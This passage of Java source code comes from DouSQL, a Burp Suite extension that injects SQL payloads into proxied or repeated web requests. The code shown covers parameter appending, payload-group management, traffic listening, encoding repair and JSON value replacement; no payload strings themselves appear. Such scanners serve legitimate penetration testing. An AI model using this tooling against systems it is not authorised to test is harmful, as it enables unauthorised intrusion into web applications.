                            api.logging().logToOutput("JSON格式验证通过，开始添加参数");
                            // 使用JsonNode进行更可靠的JSON处理
                            JsonNode rootNode = JsonNode.jsonNode(body);
                            if (rootNode.isObject()) {
                                JsonObjectNode objectNode = rootNode.asObject();
                                // 添加所有参数
                                for (String[] param : paramList) {
                                    objectNode.putString(param[0], param[1]);
                                    api.logging().logToOutput("JSON追加参数: " + param[0] + "=" + param[1]);
                                }
                                String modifiedJson = objectNode.toJsonString();
                                api.logging().logToOutput("JSON追加参数成功，共添加" + paramList.size() + "个参数到JSON body");
                                api.logging().logToOutput("修改后的JSON: " + modifiedJson);
                                return originalRequest.withBody(modifiedJson);
                            } else {
                                api.logging().logToOutput("JSON根节点不是对象，无法添加参数，改为URL参数");
                            }
                        } else {
                            api.logging().logToOutput("JSON格式验证失败，改为URL参数");
                        }
                    } catch (Exception e) {
                        api.logging().logToOutput("JSON追加参数异常，改为URL参数: " + e.getMessage());
                    }
                } else {
                    api.logging().logToOutput("JSON body为空，改为URL参数");
                }
            } else if ((contentType != null && contentType.toLowerCase().contains("form")) ||
                      (fullContentType != null && fullContentType.toLowerCase().contains("application/x-www-form-urlencoded"))) {
                // 表单格式请求
                HttpRequest modifiedRequest = originalRequest;
                for (String[] param : paramList) {
                    modifiedRequest = modifiedRequest.withAddedParameters(
                        burp.api.montoya.http.message.params.HttpParameter.parameter(
                            param[0], param[1], HttpParameterType.BODY
                        )
                    );
                    api.logging().logToOutput("表单追加参数: " + param[0] + "=" + param[1]);
                }
                api.logging().logToOutput("表单追加参数成功，共添加" + paramList.size() + "个参数到POST body");
                return modifiedRequest;
            } else {
                // URL参数或其他格式，添加到URL参数
                HttpRequest modifiedRequest = originalRequest;
                for (String[] param : paramList) {
                    modifiedRequest = modifiedRequest.withAddedParameters(
                        burp.api.montoya.http.message.params.HttpParameter.parameter(
                            param[0], param[1], HttpParameterType.URL
                        )
                    );
                    api.logging().logToOutput("URL追加参数: " + param[0] + "=" + param[1]);
                }
                api.logging().logToOutput("URL追加参数成功，共添加" + paramList.size() + "个参数到URL参数");
                return modifiedRequest;
            }
        } catch (Exception e) {
            api.logging().logToOutput("添加追加参数失败: " + e.getMessage());
        }

        return originalRequest;
    }

    // 加载白名单参数到文本框
    private void loadWhiteListToTextArea() {
        StringBuilder sb = new StringBuilder();
        for (String param : whiteListParams) {
            if (sb.length() > 0) {
                sb.append("\n");
            }
            sb.append(param);
        }
        paramListTextArea.setText(sb.toString());
    }

    // 加载黑名单参数到文本框
    private void loadBlackListToTextArea() {
        StringBuilder sb = new StringBuilder();
        for (String param : blackListParams) {
            if (sb.length() > 0) {
                sb.append("\n");
            }
            sb.append(param);
        }
        paramListTextArea.setText(sb.toString());
    }

    // 更新参数测试面板
    private void updateParamTestPanel() {
        SwingUtilities.invokeLater(() -> {
            paramTestPanel.removeAll();
            
            String text = appendParamsTextArea.getText().trim();
            if (!text.isEmpty()) {
                String[] lines = text.split("\n");
                for (String line : lines) {
                    line = line.trim();
                    if (!line.isEmpty() && line.contains(":")) {
                        String[] parts = line.split(":", 2);
                        if (parts.length == 2) {
                            String key = parts[0].trim();
                            if (!key.isEmpty()) {
                                // 获取或创建该参数的测试开关状态
                                boolean isTest = appendParamsTestMap.getOrDefault(key, false);
                                JCheckBox checkBox = new JCheckBox(key, isTest);
                                checkBox.addItemListener(e -> {
                                    appendParamsTestMap.put(key, checkBox.isSelected());
                                });
                                paramTestPanel.add(checkBox);
                            }
                        }
                    }
                }
            }
            
            if (paramTestPanel.getComponentCount() == 0) {
                JLabel emptyLabel = new JLabel("请在左侧添加参数");
                emptyLabel.setForeground(Color.GRAY);
                paramTestPanel.add(emptyLabel);
            }
            
            paramTestPanel.revalidate();
            paramTestPanel.repaint();
        });
    }
    private void deleteCurrentGroup() {
        if ("default".equals(currentGroup)) {
            JOptionPane.showMessageDialog(null, "不能删除default组", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }

        int choice = JOptionPane.showConfirmDialog(null,
            "确定要删除组 '" + currentGroup + "' 吗？",
            "确认删除",
            JOptionPane.YES_NO_OPTION);

        if (choice == JOptionPane.YES_OPTION) {
            // 删除组
            String filename = getConfigFilePath("xia_SQL_payload_" + currentGroup + ".ini");
            File file = new File(filename);
            if (file.exists()) {
                file.delete();
            }

            payloadGroups.remove(currentGroup);
            payloadGroupComboBox.removeItem(currentGroup);

            // 切换到default组
            currentGroup = "default";
            payloadGroupComboBox.setSelectedItem(currentGroup);
            loadCurrentGroupPayload();

            api.logging().logToOutput("已删除payload组: " + currentGroup);
            JOptionPane.showMessageDialog(null, "已删除组，已切换到default组", "成功", JOptionPane.INFORMATION_MESSAGE);
        }
    }

    // 重命名payload组
    private void renameCurrentGroup(String newGroupName) {
        if ("default".equals(currentGroup)) {
            JOptionPane.showMessageDialog(null, "不能重命名default组", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }
        
        if (newGroupName == null || newGroupName.trim().isEmpty()) {
            JOptionPane.showMessageDialog(null, "新组名不能为空", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }
        
        newGroupName = newGroupName.trim();
        if (payloadGroups.contains(newGroupName)) {
            JOptionPane.showMessageDialog(null, "新组名 '" + newGroupName + "' 已存在", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }
        

        // 保存当前编辑器内容到新文件
        String currentContent = payloadTextArea.getText();
        String newFilename = getConfigFilePath("xia_SQL_payload_" + newGroupName + ".ini");
        try (BufferedWriter out = new BufferedWriter(new FileWriter(newFilename))) {
            out.write(currentContent);
        } catch (IOException e) {
            api.logging().logToOutput("保存新组文件失败: " + e.getMessage());
            JOptionPane.showMessageDialog(null, "重命名失败：无法创建新文件", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }

        // 删除旧文件
        String oldFilename = getConfigFilePath("xia_SQL_payload_" + currentGroup + ".ini");
        File oldFile = new File(oldFilename);
        if (oldFile.exists()) {
            if (!oldFile.delete()) {
                api.logging().logToOutput("删除旧文件失败: " + oldFilename);
            }
        }

        // 更新组列表和UI
        int oldIndex = payloadGroups.indexOf(currentGroup);
        payloadGroups.set(oldIndex, newGroupName);
        
        // 更新ComboBox
        payloadGroupComboBox.removeItem(currentGroup);
        payloadGroupComboBox.addItem(newGroupName);
        payloadGroupComboBox.setSelectedItem(newGroupName);
        
        // 更新当前组
        currentGroup = newGroupName;
        newGroupNameField.setText("新组名");
        
        api.logging().logToOutput("已重命名payload组: " + currentGroup);
        JOptionPane.showMessageDialog(null, "已重命名组为: " + currentGroup, "成功", JOptionPane.INFORMATION_MESSAGE);
    }

    // 切换到新的payload组
    private void switchToGroup(String groupName) {
        if (!groupName.equals(currentGroup)) {
            currentGroup = groupName;
            loadCurrentGroupPayload();
            api.logging().logToOutput("已切换到payload组: " + currentGroup);
        }
    }

    // 更新报错关键字列表
    private void updateErrorKeywordsList() {
        errorKeywordsList.clear();
        String text = errorKeywordsTextArea.getText();
        String[] lines = text.split("\\n");
        for (String line : lines) {
            line = line.trim();
            if (!line.isEmpty()) {
                errorKeywordsList.add(line);
            }
        }
        api.logging().logToOutput("已更新报错关键字列表，共" + errorKeywordsList.size() + "条");
    }

    @Override
    public RequestToBeSentAction handleHttpRequestToBeSent(HttpRequestToBeSent requestToBeSent) {
        return RequestToBeSentAction.continueWith(requestToBeSent);
    }

    @Override
    public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived responseReceived) {
        // HTTP监听逻辑简化实现 - 检查工具来源
        if (switchs == 1) {
            burp.api.montoya.core.ToolSource toolSource = responseReceived.toolSource();
            if (toolSource != null && toolSource.toolType() != null) {
                ToolType toolType = toolSource.toolType();
                int toolFlag = 0;

                // 将ToolType转换为原版对应的整数值
                if (toolType == ToolType.REPEATER) {
                    toolFlag = 64;
                } else if (toolType == ToolType.PROXY) {
                    toolFlag = 4;
                } else if (toolType == ToolType.SCANNER) {
                    toolFlag = 16;
                } else if (toolType == ToolType.INTRUDER) {
                    toolFlag = 32;
                } else {
                    // 记录未处理的工具类型
                    api.logging().logToOutput("未处理的工具类型: " + toolType + ", toolFlag=0");
                }

                api.logging().logToOutput("工具来源: " + toolType + ", toolFlag=" + toolFlag + 
                                        ", clicksRepeater=" + clicksRepeater + ", clicksProxy=" + clicksProxy);

                // 修复：只处理明确启用监听的工具流量
                // 移除Scanner和Intruder的自动处理，只处理用户明确启用的工具
                if ((clicksRepeater == 64 && toolFlag == 64) || 
                    (clicksProxy == 4 && toolFlag == 4)) {
                    api.logging().logToOutput("处理来自 " + toolType + " 的流量");
                    // 在新线程中处理，使用线程安全的方式
                    final int finalToolFlag = toolFlag;
                    final HttpRequestResponse requestResponse = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(
                        responseReceived.initiatingRequest(), responseReceived);
                    
                    // 使用线程池或新线程处理，避免阻塞主线程
                    new Thread(() -> {
                        try {
                            // 添加线程名称用于调试
                            Thread.currentThread().setName("DouSQL-Worker-" + System.currentTimeMillis());
                            checkVul(requestResponse, finalToolFlag);
                        } catch (Exception ex) {
                            api.logging().logToOutput("处理HTTP响应时出错: " + ex.toString());
                            ex.printStackTrace();
                        }
                    }).start();
                } else {
                    api.logging().logToOutput("跳过来自 " + toolType + " 的流量（未启用监听）");
                }
            }
        }
        return ResponseReceivedAction.continueWith(responseReceived);
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        List<Component> menuItems = new ArrayList<>();

        // 支持从 Scanner、Proxy、Repeater 和 Intruder 发送到插件
        if (event.isFromTool(ToolType.SCANNER) || event.isFromTool(ToolType.PROXY) || 
            event.isFromTool(ToolType.REPEATER) || event.isFromTool(ToolType.INTRUDER)) {
            
            // 创建主菜单项
            JMenu douSqlMenu = new JMenu("Send to DouSQL");
            
            // 添加默认选项（使用当前选中的payload组）
            JMenuItem defaultItem = new JMenuItem("使用当前组 (" + currentGroup + ")");
            defaultItem.addActionListener(e -> {
                if (switchs == 1) {
                    java.util.Optional<MessageEditorHttpRequestResponse> messageOpt = event.messageEditorRequestResponse();
                    if (messageOpt.isPresent()) {
                        // 在新线程中处理，避免阻塞UI
                        new Thread(() -> {
                            try {
                                // 获取原始的HttpRequestResponse
                                HttpRequestResponse originalRequestResponse = messageOpt.get().requestResponse();
                                
                                // 创建编码修复后的HttpRequestResponse
                                HttpRequestResponse fixedRequestResponse = fixEncodingIssues(originalRequestResponse);
                                
                                checkVul(fixedRequestResponse, 1024);
                            } catch (Exception ex) {
                                api.logging().logToOutput("处理右键发送时出错: " + ex.toString());
                            }
                        }).start();
                    }
                } else {
                    api.logging().logToOutput("插件DouSQL关闭状态！");
                }
            });
            douSqlMenu.add(defaultItem);
            
            // 添加分隔线
            douSqlMenu.addSeparator();
            
            // 为每个payload组创建菜单项
            for (String payloadGroup : payloadGroups) {
                JMenuItem groupItem = new JMenuItem("使用 " + payloadGroup + " 组");
                groupItem.addActionListener(e -> {
                    if (switchs == 1) {
                        java.util.Optional<MessageEditorHttpRequestResponse> messageOpt = event.messageEditorRequestResponse();
                        if (messageOpt.isPresent()) {
                            // 在新线程中处理，避免阻塞UI
                            new Thread(() -> {
                                try {
                                    // 获取原始的HttpRequestResponse
                                    HttpRequestResponse originalRequestResponse = messageOpt.get().requestResponse();
                                    
                                    // 创建编码修复后的HttpRequestResponse
                                    HttpRequestResponse fixedRequestResponse = fixEncodingIssues(originalRequestResponse);
                                    
                                    checkVulWithPayloadGroup(fixedRequestResponse, 1024, payloadGroup);
                                } catch (Exception ex) {
                                    api.logging().logToOutput("处理右键发送时出错: " + ex.toString());
                                }
                            }).start();
                        }
                    } else {
                        api.logging().logToOutput("插件DouSQL关闭状态！");
                    }
                });
                douSqlMenu.add(groupItem);
            }
            
            menuItems.add(douSqlMenu);
        }

        return menuItems;
    }
    
    // 修复编码问题的方法
    private HttpRequestResponse fixEncodingIssues(HttpRequestResponse original) {
        try {
            api.logging().logToOutput("\n=== 右键菜单编码修复 ===");
            
            // 获取原始请求
            HttpRequest originalRequest = original.request();
            
            // 尝试重新构建请求以修复编码问题
            String requestString = originalRequest.toString();
            api.logging().logToOutput("原始请求字符串长度: " + requestString.length());
            
            // 尝试用不同编码重新解释请求字符串
            String[] encodings = {"UTF-8", "GBK", "GB2312", "ISO-8859-1"};
            String bestRequestString = requestString;
            
            for (String encoding : encodings) {
                try {
                    // 将字符串转为字节再用指定编码重新解释
                    byte[] requestBytes = requestString.getBytes("ISO-8859-1");
                    String reinterpreted = new String(requestBytes, encoding);
                    
                    // 检查是否包含中文字符
                    boolean hasChinese = reinterpreted.matches(".*[\\u4e00-\\u9fa5].*");
                    boolean hasValidChars = !reinterpreted.matches(".*[\\uFFFD\\u00C0-\\u00FF].*");
                    
                    api.logging().logToOutput("编码 " + encoding + " 重新解释: 包含中文=" + hasChinese + ", 无乱码=" + hasValidChars);
                    
                    if (hasChinese && hasValidChars) {
                        api.logging().logToOutput("使用编码 " + encoding + " 修复请求");
                        bestRequestString = reinterpreted;
                        break;
                    }
                } catch (Exception e) {
                    api.logging().logToOutput("编码 " + encoding + " 处理失败: " + e.getMessage());
                }
            }
            
            // 如果找到了更好的编码，重新构建请求
            if (!bestRequestString.equals(requestString)) {
                try {
                    // 使用修复后的字符串创建新的请求
                    HttpRequest fixedRequest = HttpRequest.httpRequest(bestRequestString);
                    api.logging().logToOutput("成功创建编码修复后的请求");
                    
                    // 创建新的HttpRequestResponse
                    return HttpRequestResponse.httpRequestResponse(fixedRequest, original.response());
                } catch (Exception e) {
                    api.logging().logToOutput("创建修复请求失败: " + e.getMessage());
                }
            }
            
            api.logging().logToOutput("=== 编码修复完成 ===\n");
            
        } catch (Exception e) {
            api.logging().logToOutput("编码修复过程出错: " + e.getMessage());
        }
        
        // 如果修复失败，返回原始对象
        return original;
    }
    
    // 安全的参数更新方法，避免中文字符在参数更新时被损坏
    private HttpRequest updateParameterSafely(HttpRequest originalRequest, String paramName, String newValue, HttpParameterType paramType) {
        api.logging().logToOutput("  -> 开始安全参数更新：" + paramName + " = " + newValue);
        api.logging().logToOutput("  -> 新值字节: " + java.util.Arrays.toString(newValue.getBytes(java.nio.charset.StandardCharsets.UTF_8)));
        
        try {
            // 方法1：直接使用withUpdatedParameters
            HttpRequest testRequest = originalRequest.withUpdatedParameters(
                burp.api.montoya.http.message.params.HttpParameter.parameter(paramName, newValue, paramType)
            );
            
            // 验证更新后的参数值是否正确
            List<ParsedHttpParameter> updatedParams = testRequest.parameters();
            for (ParsedHttpParameter param : updatedParams) {
                if (param.name().equals(paramName) && param.type() == paramType) {
                    String updatedValue = param.value();
                    api.logging().logToOutput("  -> 更新后的参数值: " + updatedValue);
                    api.logging().logToOutput("  -> 更新后值字节: " + java.util.Arrays.toString(updatedValue.getBytes(java.nio.charset.StandardCharsets.UTF_8)));
                    
                    // 检查是否包含中文字符
                    boolean originalHasChinese = newValue.matches(".*[\\u4e00-\\u9fa5].*");
                    boolean updatedHasChinese = updatedValue.matches(".*[\\u4e00-\\u9fa5].*");
                    
                    if (originalHasChinese && !updatedHasChinese) {
                        api.logging().logToOutput("  -> 检测到中文字符丢失，尝试手动构造请求");
                        return buildRequestManually(originalRequest, paramName, newValue, paramType);
                    } else {
                        api.logging().logToOutput("  -> 参数更新成功，中文字符保持完整");
                        return testRequest;
                    }
                }
            }
            
            api.logging().logToOutput("  -> 参数更新成功：" + paramName + " = " + newValue);
            return testRequest;
            
        } catch (Exception e) {
            api.logging().logToOutput("  -> withUpdatedParameters失败：" + e.getMessage());
            
            // 方法2：对于URL参数，尝试URL编码
            if (paramType == HttpParameterType.URL) {
                try {
                    String encodedValue = java.net.URLEncoder.encode(newValue, "UTF-8");
                    api.logging().logToOutput("  -> 尝试URL编码：" + encodedValue);
                    
                    HttpRequest testRequest = originalRequest.withUpdatedParameters(
                        burp.api.montoya.http.message.params.HttpParameter.parameter(paramName, encodedValue, paramType)
                    );
                    api.logging().logToOutput("  -> URL编码后参数更新成功");
                    return testRequest;
                } catch (Exception e2) {
                    api.logging().logToOutput("  -> URL编码后仍失败：" + e2.getMessage());
                }
            }
            
            // 方法3：手动构造请求
            api.logging().logToOutput("  -> 尝试手动构造请求");
            return buildRequestManually(originalRequest, paramName, newValue, paramType);
        }
    }
    
    // 手动构造请求的方法，用于处理复杂的编码情况
    private HttpRequest buildRequestManually(HttpRequest originalRequest, String paramName, String newValue, HttpParameterType paramType) {
        try {
            String requestString = originalRequest.toString();
            api.logging().logToOutput("  -> 手动构造请求，原始请求长度: " + requestString.length());
            
            if (paramType == HttpParameterType.URL) {
                // 处理URL参数
                String[] lines = requestString.split("\n");
                if (lines.length > 0) {
                    String requestLine = lines[0];
                    if (requestLine.contains("?")) {
                        String[] parts = requestLine.split("\\?");
                        String baseUrl = parts[0];
                        String queryString = parts[1].split(" ")[0];
                        String httpVersion = requestLine.substring(requestLine.lastIndexOf(" "));
                        
                        // 重构查询字符串
                        String[] params = queryString.split("&");
                        StringBuilder newQueryString = new StringBuilder();
                        boolean paramFound = false;
                        
                        for (String param : params) {
                            if (param.startsWith(paramName + "=")) {
                                if (newQueryString.length() > 0) newQueryString.append("&");
                                // 对于中文字符，不进行URL编码，直接使用修复后的值
                                boolean hasChinese = newValue.matches(".*[\\u4e00-\\u9fa5].*");
                                if (hasChinese) {
                                    newQueryString.append(paramName).append("=").append(newValue);
                                    api.logging().logToOutput("  -> 中文参数不进行URL编码: " + newValue);
                                } else {
                                    String encodedValue = java.net.URLEncoder.encode(newValue, "UTF-8");
                                    newQueryString.append(paramName).append("=").append(encodedValue);
                                }
                                paramFound = true;
                            } else {
                                if (newQueryString.length() > 0) newQueryString.append("&");
                                newQueryString.append(param);
                            }
                        }
                        
                        if (paramFound) {
                            // 重构第一行
                            lines[0] = baseUrl + "?" + newQueryString.toString() + httpVersion;
                            String newRequestString = String.join("\n", lines);
                            
                            HttpRequest newRequest = HttpRequest.httpRequest(newRequestString);
                            api.logging().logToOutput("  -> 手动构造URL参数请求成功");
                            return newRequest;
                        }
                    }
                }
            } else if (paramType == HttpParameterType.BODY) {
                // 处理POST参数
                String[] parts = requestString.split("\r\n\r\n", 2);
                if (parts.length > 1) {
                    String headers = parts[0];
                    String body = parts[1];
                    
                    // 重构请求体
                    if (body.contains("&") || body.contains("=")) {
                        String[] params = body.split("&");
                        StringBuilder newBody = new StringBuilder();
                        boolean paramFound = false;
                        
                        for (String param : params) {
                            if (param.startsWith(paramName + "=")) {
                                if (newBody.length() > 0) newBody.append("&");
                                // 对于中文字符，不进行URL编码，直接使用修复后的值
                                boolean hasChinese = newValue.matches(".*[\\u4e00-\\u9fa5].*");
                                if (hasChinese) {
                                    newBody.append(paramName).append("=").append(newValue);
                                    api.logging().logToOutput("  -> 中文POST参数不进行URL编码: " + newValue);
                                } else {
                                    String encodedValue = java.net.URLEncoder.encode(newValue, "UTF-8");
                                    newBody.append(paramName).append("=").append(encodedValue);
                                }
                                paramFound = true;
                            } else {
                                if (newBody.length() > 0) newBody.append("&");
                                newBody.append(param);
                            }
                        }
                        
                        if (paramFound) {
                            String newRequestString = headers + "\r\n\r\n" + newBody.toString();
                            HttpRequest newRequest = HttpRequest.httpRequest(newRequestString);
                            api.logging().logToOutput("  -> 手动构造POST参数请求成功");
                            return newRequest;
                        }
                    }
                }
            }
            
        } catch (Exception e) {
            api.logging().logToOutput("  -> 手动构造请求失败: " + e.getMessage());
        }
        
        return null;
    }

    // URL匹配工具方法，支持通配符
    private boolean isUrlMatched(String url, String pattern) {
        try {
            // 将通配符模式转换为正则表达式
            String regex = pattern
                .replace(".", "\\.")  // 转义点号
                .replace("*", ".*")   // 将*转换为.*
                .replace("?", ".");   // 将?转换为.
            
            // 检查URL路径是否匹配
            return url.matches(".*" + regex + ".*");
        } catch (Exception e) {
            // 如果正则表达式有问题，使用简单的包含匹配
            return url.contains(pattern);
        }
    }

    // 使用Burp Suite内置JsonUtils的JSON值替换方法
    private String replaceJsonValue(String jsonBody, String paramName, String newValue) {
        try {
            JsonUtils jsonUtils = api.utilities().jsonUtils();
            
            // 验证JSON格式
            if (!jsonUtils.isValidJson(jsonBody)) {
                api.logging().logToOutput("  -> 无效的JSON格式");
                return jsonBody;
            }
            
            // 查找并替换参数
            java.util.List<String> foundPaths = findJsonPaths(jsonBody, paramName);
            
            if (foundPaths.isEmpty()) {
                api.logging().logToOutput("  -> 未找到参数: " + paramName);
                return jsonBody;
            }
            
            // 使用第一个找到的路径进行替换
            String path = foundPaths.get(0);
            
            // 确保中文字符正确处理，使用JSON转义
            String jsonValue;
            try {
                // 对于中文字符，不需要额外的转义，直接使用原始值
                // JSON标准支持UTF-8编码的中文字符
                jsonValue = "\"" + newValue.replace("\\", "\\\\").replace("\"", "\\\"") + "\"";
                
                // 验证中文字符是否正确编码
                byte[] valueBytes = newValue.getBytes(StandardCharsets.UTF_8);
                String decodedValue = new String(valueBytes, StandardCharsets.UTF_8);
                if (!decodedValue.equals(newValue)) {
                    api.logging().logToOutput("  -> 警告：中文字符编码可能有问题");
                }
            } catch (Exception e) {
                // 如果转义失败，使用简单的引号包围
                jsonValue = "\"" + newValue + "\"";
            }
            
            // 添加详细的JSON处理调试信息
            api.logging().logToOutput("  -> JSON处理调试:");
            api.logging().logToOutput("    原始JSON: " + jsonBody);
            api.logging().logToOutput("    替换路径: " + path);
            api.logging().logToOutput("    新值: " + newValue);
            api.logging().logToOutput("    JSON值: " + jsonValue);
            api.logging().logToOutput("    新值字节: " + java.util.Arrays.toString(newValue.getBytes(StandardCharsets.UTF_8)));
            
            String modifiedJson = jsonUtils.update(jsonBody, path, jsonValue);
            
            api.logging().logToOutput("    修改后JSON: " + modifiedJson);
            api.logging().logToOutput("  -> JSON替换成功，路径: " + path + ", 新值: " + jsonValue);
            
            // 验证修改后的JSON是否包含正确的中文字符
            if (modifiedJson.contains(newValue)) {
                api.logging().logToOutput("  -> 验证成功：修改后的JSON包含正确的中文字符");
            } else {
                api.logging().logToOutput("  -> 警告：修改后的JSON可能不包含正确的中文字符");
                api.logging().logToOutput("  -> 尝试使用字符串替换方法");
                
                // 备选方案：使用字符串替换
                String fallbackJson = replaceJsonValueByString(jsonBody, paramName, newValue);
                if (!fallbackJson.equals(jsonBody)) {
                    api.logging().logToOutput("  -> 字符串替换成功");
                    return fallbackJson;
                }
            }
            
            return modifiedJson;
            
        } catch (Exception e) {
            api.logging().logToOutput("  -> JSON处理异常: " + e.getMessage());
            api.logging().logToOutput("  -> 尝试使用字符串替换方法");
            
            // 备选方案：使用字符串替换
            return replaceJsonValueByString(jsonBody, paramName, newValue);
        }
    }
    
    // 备选的JSON值替换方法，使用字符串操作
    private String replaceJsonValueByString(String jsonBody, String paramName, String newValue) {
        try {
            api.logging().logToOutput("  -> 使用字符串替换方法处理JSON");
            
            // 确保中文字符正确处理
            api.logging().logToOutput("  -> 字符串替换调试信息：");
            api.logging().logToOutput("    参数名: " + paramName);
            api.logging().logToOutput("    新值: " + newValue);
            api.logging().logToOutput("    新值字节: " + java.util.Arrays.toString(newValue.getBytes(StandardCharsets.UTF_8)));
            
            // 查找参数的模式：\"paramName\":\"oldValue\"
            String pattern = "\"" + paramName + "\"\\s*:\\s*\"[^\"]*\"";
            // 对中文字符进行正确的转义处理
            String escapedValue = newValue.replace("\\", "\\\\").replace("\"", "\\\"");
            String replacement = "\"" + paramName + "\":\"" + escapedValue + "\"";
            
            api.logging().logToOutput("    查找模式: " + pattern);
            api.logging().logToOutput("    替换内容: " + replacement);
            api.logging().logToOutput("    转义后的值: " + escapedValue);
            
            String result = jsonBody.replaceAll(pattern, replacement);
            
            if (!result.equals(jsonBody)) {
                api.logging().logToOutput("  -> 字符串替换成功");
                // 验证替换后的结果是否包含正确的中文字符
                if (result.contains(newValue)) {
                    api.logging().logToOutput("  -> 验证成功：替换后的JSON包含正确的中文字符");
                } else {
                    api.logging().logToOutput("  -> 警告：替换后的JSON可能不包含正确的中文字符");
                }
                return result;
            } else {
                api.logging().logToOutput("  -> 字符串替换失败，返回原始JSON");
                return jsonBody;
            }
            
        } catch (Exception e) {
            api.logging().logToOutput("  -> 字符串替换异常: " + e.getMessage());
            return jsonBody;
        }
    }
    
    // 查找JSON中所有匹配参数名的路径
    private java.util.List<String> findJsonPaths(String jsonBody, String paramName) {
        java.util.List<String> paths = new java.util.ArrayList<>();
        
        try {
            JsonNode rootNode = JsonNode.jsonNode(jsonBody);
            findJsonPathsRecursive(rootNode, "", paramName, paths);
        } catch (Exception e) {
            api.logging().logToOutput("  -> 查找JSON路径异常: " + e.getMessage());
        }
        
        return paths;
    }
    
    // 递归查找JSON路径
    private void findJsonPathsRecursive(JsonNode node, String currentPath, String targetParam, java.util.List<String> paths) {
        try {
            if (node.isObject()) {
                JsonObjectNode objectNode = node.asObject();
                
                // 遍历对象的所有键
                for (String key : objectNode.asMap().keySet()) {
                    String newPath = currentPath.isEmpty() ? key : currentPath + "." + key;
                    
                    // 如果键名匹配目标参数，添加路径
                    if (key.equals(targetParam)) {
                        paths.add(newPath);
                    }
                    
                    // 递归处理值
                    JsonNode childNode = objectNode.get(key);
                    if (childNode != null) {
                        findJsonPathsRecursive(childNode, newPath, targetParam, paths);
                    }
                }
            } else if (node.isArray()) {
                JsonArrayNode arrayNode = node.asArray();
                
                // 遍历数组的所有元素
                for (int i = 0; i < arrayNode.asList().size(); i++) {
                    String newPath = currentPath + "[" + i + "]";
                    JsonNode childNode = arrayNode.get(i);
                    if (childNode != null) {
                        findJsonPathsRecursive(childNode, newPath, targetParam, paths);
                    }
                }
            }
        } catch (Exception e) {
            api.logging().logToOutput("  -> 递归查找路径异常: " + e.getMessage());
        }
    }
    
    // JSON结构信息类
    private static class JsonStructureInfo {
        boolean hasNestedObjects = false;
        boolean hasArrays = false;
        int maxDepth = 0;
        int objectCount = 0;
        int arrayCount = 0;
    }
    
    // 分析JSON结构的复杂度
    private JsonStructureInfo analyzeJsonStructure(String json) {
        JsonStructureInfo info = new JsonStructureInfo();
        
        try {
            JsonNode rootNode = JsonNode.jsonNode(json);
            analyzeJsonNodeRecursive(rootNode, 0, info);
        } catch (Exception e) {
            api.logging().logToOutput("JSON结构分析异常: " + e.getMessage());
        }
        
        return info;
    }
    
    // 递归分析JSON节点结构
    private void analyzeJsonNodeRecursive(JsonNode node, int currentDepth, JsonStructureInfo info) {
        if (currentDepth > 20) { // 防止无限递归
            return;
        }
        
        info.maxDepth = Math.max(info.maxDepth, currentDepth);
        
        try {
            if (node.isObject()) {
                info.objectCount++;
                if (currentDepth > 0) {
                    info.hasNestedObjects = true;
                }
                
                JsonObjectNode objectNode = node.asObject();
                for (String key : objectNode.asMap().keySet()) {
                    JsonNode childNode = objectNode.get(key);
                    if (childNode != null) {
                        analyzeJsonNodeRecursive(childNode, currentDepth + 1, info);
                    }
                }
            } else if (node.isArray()) {
                info.arrayCount++;
                info.hasArrays = true;
                
                JsonArrayNode arrayNode = node.asArray();
                for (int i = 0; i < arrayNode.asList().size(); i++) {
                    JsonNode childNode = arrayNode.get(i);
                    if (childNode != null) {
                        analyzeJsonNodeRecursive(childNode, currentDepth + 1, info);
                    }
                }
            }
        } catch (Exception e) {
            api.logging().logToOutput("递归分析异常: " + e.getMessage());
        }
    }

    // 核心漏洞检查方法
    private void checkVul(HttpRequestResponse baseRequestResponse, int toolFlag) {
        if (baseRequestResponse == null || baseRequestResponse.request() == null) {
            api.logging().logToOutput("检查漏洞：无效的请求");
            return;
        }

        String md5Data = null; // 声明在try块外面，这样catch块也能访问
        
        try {
            HttpRequest request = baseRequestResponse.request();
            String originalUrl = request.url();
            
            // 添加追加参数（如果启用）
            request = addAppendParameters(request);
            String finalUrl = request.url();
            
            // 如果URL发生变化，说明追加参数生效了
            if (!originalUrl.equals(finalUrl)) {
                api.logging().logToOutput("追加参数已生效: " + originalUrl + " -> " + finalUrl);
            }
            
            String url = request.url();
            String method = request.method();

            // HTTP方法过滤 - 只检测GET和POST请求
            if (!method.equalsIgnoreCase("GET") && !method.equalsIgnoreCase("POST")) {
                api.logging().logToOutput("跳过非GET/POST请求：" + method + " " + url);
                return;
            }

            // 白名单检查
            if (whiteSwitchs == 1 && !whiteURL.isEmpty()) {
                String[] whiteUrlList = whiteURL.split(",");
                boolean isWhiteListed = false;
                for (String white : whiteUrlList) {
                    if (url.contains(white.trim())) {
                        api.logging().logToOutput("白名单URL：" + url);
                        isWhiteListed = true;
                        break;
                    }
                }
                if (!isWhiteListed) {
                    api.logging().logToOutput("非白名单URL：" + url);
                    return;
                }
            }

            // 黑名单URL检查
            if (!blackListUrls.isEmpty()) {
                for (String blackUrl : blackListUrls) {
                    if (isUrlMatched(url, blackUrl)) {
                        api.logging().logToOutput("命中黑名单URL，跳过：" + url + " (规则：" + blackUrl + ")");
                        return;
                    }
                }
            }

            // 静态文件检查
            if (toolFlag == 4 || toolFlag == 64) { // Proxy或Repeater
                String[] staticFiles = {"jpg", "jpeg", "png", "gif", "bmp", "tiff", "tif", "webp", "svg", "ico", 
                                       "css", "js", "pdf", "mp3", "mp4", "avi", "mov", "wmv", "flv", "mkv", 
                                       "woff", "woff2", "ttf", "eot", "otf", "zip", "rar", "7z", "tar", "gz"};
                String[] urlParts = url.split("\\.");
                if (urlParts.length > 1) {
                    String extension = urlParts[urlParts.length - 1].toLowerCase();
                    for (String ext : staticFiles) {
                        if (extension.equals(ext)) {
                            api.logging().logToOutput("静态文件跳过：" + url);
                            return;
                        }
                    }
                }
            }

            // 原版逻辑：构建MD5字符串（URL + 参数名 + HTTP方法）
            String tempData = url.split("\\?")[0]; // 获取URL问号前面的部分
            int isAdd = 0;
            String requestData = null;
            String[] requestDatas;
            int jsonCount = -1;

            // 获取所有参数
            List<ParsedHttpParameter> paraLists = request.parameters();

